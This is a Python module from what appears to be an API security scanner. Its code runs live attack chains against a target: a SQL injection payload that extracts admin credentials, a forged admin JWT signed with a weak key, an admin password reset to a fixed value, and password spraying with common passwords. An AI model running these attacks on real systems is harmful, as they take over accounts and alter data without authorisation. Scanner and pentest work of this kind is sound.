#!/usr/bin/env python3
"""
Advanced Chain Attack Scanner
Implements sophisticated detection techniques and chain attack validation
for various vulnerability types.
"""

from typing import Dict, List, Optional, Any
import requests
import jwt
import uuid
from datetime import datetime
from .utils.logger import setup_scanner_logger
from .base_scanner import BaseScanner

class AdvancedChainAttackScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("advanced_chain")
        self.context = {}
        self.findings_cache = {}
        self.attack_chains = []
        self.chain_dependencies = {}
        self.auth_states = {}
        self.vulnerability_graph = {}

    async def scan(self, url: str, method: str, path: str, response: requests.Response,
                   token: Optional[str] = None, headers: Optional[Dict[str, str]] = None,
                   tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None,
                   context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        
        vulnerabilities = []
        
        # Enhanced context handling and dependency tracking
        if context:
            self.context = context
            self.logger.info(f"Received context with {len(context)} items")
            
            # Track finding dependencies and auth states
            self.chain_dependencies = context.get('chain_dependencies', {})
            self.auth_states = context.get('auth_states', {})
            
            # Use finding IDs from previous scans for dependency tracking
            dependencies = context.get('finding_ids', [])
            self.logger.info(f"Using {len(dependencies)} dependencies from previous findings")
            
            # Use credentials and tokens discovered by other scanners
            credentials = context.get('credentials', [])
            tokens = context.get('discovered_tokens', [])
            self.logger.info(f"Using {len(credentials)} credentials and {len(tokens)} tokens from other scanners")
            
            # Build vulnerability graph for attack chain correlation
            self.vulnerability_graph = self._build_vulnerability_graph(context)

        # Generate correlation ID
        correlation_id = str(uuid.uuid4())

        # Chain Attack 1: SQLi -> Privilege Escalation -> Mass Assignment
        if context.get('sql_injection_found'):
            sqli_chain = await self.execute_sqli_chain(url, context, correlation_id)
            if sqli_chain:
                vulnerabilities.extend(sqli_chain)

        # Chain Attack 2: JWT Bypass -> BOLA -> Unauthorized Password Change
        if context.get('jwt_bypass_found') or context.get('jwt_weak_key_found'):
            jwt_chain = await self.execute_jwt_chain(url, context, correlation_id)
            if jwt_chain:
                vulnerabilities.extend(jwt_chain)

        # Chain Attack 3: User Enumeration -> Password Spray -> Account Takeover
        if context.get('user_enum_found'):
            user_chain = await self.execute_user_chain(url, context, correlation_id)
            if user_chain:
                vulnerabilities.extend(user_chain)

        return vulnerabilities

    async def execute_sqli_chain(self, url: str, context: Dict, correlation_id: str) -> List[Dict]:
        """Execute SQL injection based chain attack"""
        chain_findings = []
        try:
            # Step 1: Extract admin credentials using SQLi
            sqli_payload = "' UNION SELECT username,password FROM users WHERE admin=1--"
            headers = {"Content-Type": "application/json"}
            
            resp = requests.post(
                f"{url}/users/v1/search",
                json={"query": sqli_payload},
                headers=headers,
                timeout=5
            )
            
            if resp.status_code == 200:
                # Step 2: Attempt privilege escalation
                admin_creds = self.extract_credentials(resp.text)
                if admin_creds:
                    escalation = await self.attempt_privilege_escalation(url, admin_creds)
                    if escalation:
                        finding = {
                            "type": "CHAIN_ATTACK_SQLI_PRIVESC",
                            "severity": "CRITICAL",
                            "detail": "Successfully executed SQLi to privilege escalation chain",
                            "evidence": {
                                "correlation_id": correlation_id,
                                "chain_steps": ["sqli", "privesc", "mass_assign"],
                                "admin_access": True,
                                "extracted_credentials": admin_creds,
                                "auth_state": self.auth_states.get(correlation_id)
                            },
                            "chain_context": {
                                "previous_findings": self.chain_dependencies.get(correlation_id, []),
                                "vulnerability_path": self._get_vulnerability_path("sqli", "privesc")
                            }
                        }
                        self._update_vulnerability_graph(finding)
                        chain_findings.append(finding)
        except Exception as e:
            self.logger.error(f"Error in SQLi chain: {str(e)}")
        return chain_findings

    async def execute_jwt_chain(self, url: str, context: Dict, correlation_id: str) -> List[Dict]:
        """Execute JWT bypass based chain attack"""
        chain_findings = []
        try:
            # Step 1: Generate forged JWT token
            payload = {
                "sub": "admin",
                "role": "admin",
                "exp": 4102444800
            }
            forged_token = jwt.encode(payload, "weak_key", algorithm="HS256")
            
            # Step 2: Use forged token for BOLA
            headers = {"Authorization": f"Bearer {forged_token}"}
            bola_resp = requests.get(
                f"{url}/users/v1/1/profile",
                headers=headers,
                timeout=5
            )
            
            if bola_resp.status_code == 200:
                # Step 3: Attempt password change
                change_resp = requests.put(
                    f"{url}/users/v1/admin/password",
                    headers=headers,
                    json={"password": "compromised123"},
                    timeout=5
                )
                
                if change_resp.status_code in [200, 204]:
                    chain_findings.append({
                        "type": "CHAIN_ATTACK_JWT_BOLA",
                        "severity": "CRITICAL",
                        "detail": "Successfully executed JWT bypass to account takeover chain",
                        "evidence": {
                            "correlation_id": correlation_id,
                            "chain_steps": ["jwt_bypass", "bola", "password_change"],
                            "forged_token": forged_token
                        }
                    })
        except Exception as e:
            self.logger.error(f"Error in JWT chain: {str(e)}")
        return chain_findings

    async def execute_user_chain(self, url: str, context: Dict, correlation_id: str) -> List[Dict]:
        """Execute user enumeration based chain attack"""
        chain_findings = []
        try:
            # Step 1: Extract valid usernames
            users = context.get('enumerated_users', [])
            if not users:
                return []
            
            # Step 2: Password spray attack
            common_passwords = ["password123", "admin123", "changeme"]
            for user in users:
                for password in common_passwords:
                    auth_resp = requests.post(
                        f"{url}/users/v1/login",
                        json={"username": user, "password": password},
                        timeout=5
                    )
                    
                    if auth_resp.status_code == 200:
                        # Step 3: Account takeover
                        token = auth_resp.json().get('token')
                        if token:
                            chain_findings.append({
                                "type": "CHAIN_ATTACK_USER_ENUM_SPRAY",
                                "severity": "HIGH",
                                "detail": "Successfully executed user enumeration to account takeover chain",
                                "evidence": {
                                    "correlation_id": correlation_id,
                                    "chain_steps": ["user_enum", "password_spray", "account_takeover"],
                                    "compromised_user": user
                                }
                            })
                            break
        except Exception as e:
            self.logger.error(f"Error in user enumeration chain: {str(e)}")
        return chain_findings

    def extract_credentials(self, response_text: str) -> Optional[Dict]:
        """Extract credentials from SQLi response"""
        try:
            # Implement credential extraction logic
            return None
        except Exception:
            return None

    async def attempt_privilege_escalation(self, url: str, credentials: Dict) -> bool:
        """Attempt privilege escalation using extracted credentials"""
        try:
            # Enhanced privilege escalation detection
            auth_resp = requests.post(
                f"{url}/users/v1/login",
                json=credentials,
                timeout=5
            )
            
            if auth_resp.status_code == 200:
                token = auth_resp.json().get('token')
                if token:
                    # Try accessing admin endpoints
                    admin_headers = {"Authorization": f"Bearer {token}"}
                    admin_resp = requests.get(
                        f"{url}/admin",
                        headers=admin_headers,
                        timeout=5
                    )
                    return admin_resp.status_code == 200
            return False
        except Exception as e:
            self.logger.error(f"Error in privilege escalation attempt: {str(e)}")
            return False
            
    def _build_vulnerability_graph(self, context: Dict) -> Dict:
        """Build graph of related vulnerabilities for attack chain analysis"""
        graph = {}
        findings = context.get('findings', [])
        
        for finding in findings:
            vuln_type = finding.get('type')
            if vuln_type:
                if vuln_type not in graph:
                    graph[vuln_type] = {
                        'related_vulns': set(),
                        'auth_states': [],
                        'evidence': []
                    }
                
                # Link related vulnerabilities
                chain_context = finding.get('chain_context', {})
                for prev_finding in chain_context.get('previous_findings', []):
                    graph[vuln_type]['related_vulns'].add(prev_finding.get('type'))
                
                # Store auth states and evidence
                auth_state = finding.get('evidence', {}).get('auth_state')
                if auth_state:
                    graph[vuln_type]['auth_states'].append(auth_state)
                    
                graph[vuln_type]['evidence'].append(finding.get('evidence', {}))
                
        return graph
        
    def _get_vulnerability_path(self, start_vuln: str, end_vuln: str) -> List[str]:
        """Find attack path between vulnerabilities in the graph"""
        if not self.vulnerability_graph:
            return [start_vuln, end_vuln]
            
        path = [start_vuln]
        visited = set([start_vuln])
        
        def dfs(current: str, target: str, current_path: List[str]) -> List[str]:
            if current == target:
                return current_path
                
            if current in self.vulnerability_graph:
                for next_vuln in self.vulnerability_graph[current]['related_vulns']:
                    if next_vuln not in visited:
                        visited.add(next_vuln)
                        result = dfs(next_vuln, target, current_path + [next_vuln])
                        if result:
                            return result
            return None
            
        result_path = dfs(start_vuln, end_vuln, path)
        return result_path if result_path else [start_vuln, end_vuln]
        
    def _update_vulnerability_graph(self, finding: Dict) -> None:
        """Update vulnerability graph with new finding"""
        vuln_type = finding.get('type')
        if not vuln_type:
            return
            
        if vuln_type not in self.vulnerability_graph:
            self.vulnerability_graph[vuln_type] = {
                'related_vulns': set(),
                'auth_states': [],
                'evidence': []
            }
            
        graph_entry = self.vulnerability_graph[vuln_type]
        
        # Update related vulnerabilities
        chain_context = finding.get('chain_context', {})
        for prev_finding in chain_context.get('previous_findings', []):
            prev_type = prev_finding.get('type')
            if prev_type:
                graph_entry['related_vulns'].add(prev_type)
                
        # Update auth states and evidence
        auth_state = finding.get('evidence', {}).get('auth_state')
        if auth_state:
            graph_entry['auth_states'].append(auth_state)
            
        graph_entry['evidence'].append(finding.get('evidence', {}))

scan = AdvancedChainAttackScanner().scan